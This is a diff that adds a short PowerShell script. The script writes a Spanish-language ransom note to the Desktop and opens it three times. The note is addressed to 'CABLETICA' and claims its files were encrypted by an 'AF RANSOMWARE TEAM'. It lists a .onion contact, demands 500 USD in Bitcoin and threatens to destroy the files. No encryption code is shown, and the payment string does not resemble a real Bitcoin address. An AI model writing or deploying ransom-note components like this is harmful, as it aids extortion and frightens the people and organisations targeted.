@@ -1,0 +1,25 @@
+$strings = @()
+$strings += ""
+$strings += @"                                             
+--------HOLA CABLETICA TUS ARCHIVOS HAN SIDO ENCRIPTADOS--------
+	
+-----------Usted ha ejecutado software malicioso en este equipo-----------
+
+-----------Comuniquese por favor con el area de seguridad de la informacion-----------
+
+-----------Sus archivos estan cifrados-----------
+
+-----------AF RANSOMWARE TEAM-----------
+
+-----------2nvk2d6sb3hxoyf.onion----------
+
+-----------Para Recuperar sus datos consigne a la siguiente cuenta de Bitcoin 500 USD-----------
+
+	PhxHNJK55SXfU7-nJ13eBoeXFiqdTsL==
+
+-----------Todos sus archivos seran destruidos-----------
+"@                                                                                                                             
+$strings | Set-Content "~/Desktop/AF-README.txt"
+start "~/Desktop/AF-README.txt"
+start "~/Desktop/AF-README.txt"
+start "~/Desktop/AF-README.txt"
